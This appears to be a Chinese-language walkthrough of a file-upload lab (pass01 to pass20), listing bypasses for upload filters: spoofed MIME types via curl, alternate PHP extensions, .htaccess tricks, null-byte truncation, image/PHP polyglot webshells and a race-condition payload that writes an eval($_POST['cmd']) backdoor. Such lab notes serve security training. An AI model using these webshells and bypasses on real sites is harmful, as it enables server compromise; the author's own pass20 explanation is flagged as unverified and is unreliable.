```sh
#防御
1.限制后缀(白名单)
2.文件名重命名
3.上传目录禁止运行脚本(需在 nginx 或 apache 进行相应配置)
```



```sh
pass01:
绕过页面js 校验方法check_file():
 F12 控制台输入:window.check_file() = function(){return true;};	#回车,运行可覆盖页面方法一次
 然后上传即可
```

```sh
pass02:
绕过mime类型 (限制了图片类型):
#curl指定type
curl -F "upload_file=@a.php;type=image/jpeg" -F "submit=上传" -- http://xxx.xx/index.php
```

```sh
pass03:
绕过后缀限制 (限制不允许.php)
#改后缀 .phtml .php3 .php5 .php7 .phps 尝试
.phptml 和 .php3 	#通过

```

```sh
pass04:
后缀限制加强了...

#尝试可能的漏洞解析,apache:
1. 先上传.htaccess 文件,内容:
AddType application/x-httpd-php .jpg
2. 再将php文件后缀改成jpg,尝试	#通过

#nginx尝试:			--可能的解析漏洞
1. php改后缀为jpg,上传
2. 访问:http://example.com/upload/a.jpg/.php
```

```sh
pass05:
#尝试大小写:		#apache默认对扩展名不区分大小写
尝试大小写: Php,PHp ...
后面加点或空格: php., php  ...
```

```sh
pass06:
#尝试文件名后面加空格	#注意:windows会把空格吃掉,所以需要在linux里操作
```

```sh
pass07-08:
#同pass06,不过后面加.

pass09:
#尝试. .		#点空格点		#不要用浏览器上传

pass10:
#尝试嵌套后缀: .php.php
```

```sh
pass11:
服务器代码类似:
$img_path = $_GET['save_path'] . "/" . rand(10, 99) . date("YmdHis") . "." . $file_ext;

早期版本的php,字符串处理遇到 \0（十六进制 0x00）会认为字符串已经结束。
#尝试插入截断符\0,控制上传的文件名

pass12:
#同pass11,不过是post请求,截断		#不要用浏览器
```

```sh
pass13-14-15:
#尝试制作图片马:
cat real.jpg shell.php > image_shell.jpg	# Linux / macOS
--------------
copy /b real.jpg + shell.php image_shell.jpg	# Windows
============================
#手动方式写入,在php文件头部加入图片特征码:
-----------
GIF89a
<?php phpinfo(); ?>
-----------
#说明
GIF: 在代碼前添加 GIF89a
JPG: 十六進制開頭為 FF D8 FF
PNG: 十六進制開頭為 89 50 4E 47
```

```sh
pass16:
服务器会对图片进行二次渲染
#尝试本地制作图片对比,在图片里渲染没涉及到的地方插入代码
```

```sh
pass17-18:
条件竞争漏洞: 服务器先保存文件再判断是否合法
#尝试一边不断上传,一边持续访问
	--在服务器保存了还没校验完删除的间隔,访问命中,则执行木马,木马立即创建木马:
	< ?php
	// 一旦被执行，就在同级目录下创建一个真正的后门 file.php
	fputs(fopen('file.php','w'),'<- ?php @ev--al($_POST["cmd"]); ? ->');
	? >
```

```sh
pass19:
php服务器限制后缀,文件上传函数为 move_uploaded_file
#尝试改上传文件名为 .php/.
	--文件名最后的 . 绕过后缀限制
	--Linux/Apache 环境下,文件名最后的 /. 会被move_uploaded_file函数忽略
```

```sh
pass20:
服务器对上传文件名后缀进行校验,且把文件名以.号2分割成数组,取最后一个字段$file[count($file)-1],组成新文件后缀
#尝试上传文件名改成数组形式
save_name[0] = shell.php/	#这是最终保存的文件名开头
save_name[1] = 				#留空，用于绕过 $file[1] 的检查
save_name[2] = jpg 			#用于让 count($file)-1 指向这个合法的白名单后缀
#说明:
数组计数漏洞:如上数组,此时count(save_name)=2,而不是3	#待检验?
```

